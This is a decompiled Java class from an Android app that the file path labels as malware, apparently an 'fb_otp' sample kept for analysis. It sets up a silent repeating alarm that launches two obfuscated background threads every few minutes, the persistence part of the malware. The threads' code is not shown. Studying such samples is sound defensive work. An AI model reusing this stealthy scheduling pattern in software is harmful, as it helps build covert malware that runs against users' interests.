package com.soft360.iService;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import cA;
import cB;
import ef;

public class Alarm
  extends BroadcastReceiver
{
  public static void a(Context paramContext)
  {
    try
    {
      Thread.setDefaultUncaughtExceptionHandler(new ef(paramContext));
      AlarmManager localAlarmManager = (AlarmManager)paramContext.getSystemService("alarm");
      PendingIntent localPendingIntent = PendingIntent.getBroadcast(paramContext, 0, new Intent(paramContext, Alarm.class), 0);
      int i = Integer.parseInt(paramContext.getString(2131165190));
      localAlarmManager.setRepeating(0, System.currentTimeMillis(), i * 60000, localPendingIntent);
      return;
    }
    catch (Exception paramContext) {}
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    paramIntent = new cA(this);
    paramIntent.a = paramContext;
    paramIntent.start();
    paramIntent = new cB(this);
    paramIntent.a = paramContext;
    paramIntent.start();
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/com/soft360/iService/Alarm.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */